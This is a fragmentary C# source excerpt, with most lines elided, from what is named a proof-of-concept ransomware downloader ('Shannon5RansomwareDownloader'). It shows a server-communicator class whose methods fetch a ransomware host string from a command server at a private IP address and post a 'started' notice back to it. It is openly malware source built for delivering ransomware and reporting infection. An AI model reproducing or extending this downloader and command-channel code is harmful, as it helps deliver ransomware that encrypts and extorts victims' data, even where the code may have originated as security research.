...
namespace Shannon5RansomwareDownloader
{
    class serverCommunicator
    {
        ...
        public static void getPoCRansomware()
        {
            ...
            var responseString = client.GetStringAsync("http://192.168.8.102/v1/index.php/getsh5host").Result;
        ...
        public static async void postPoCStarted()
        {
            ...
            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postsh5started", content).Result;
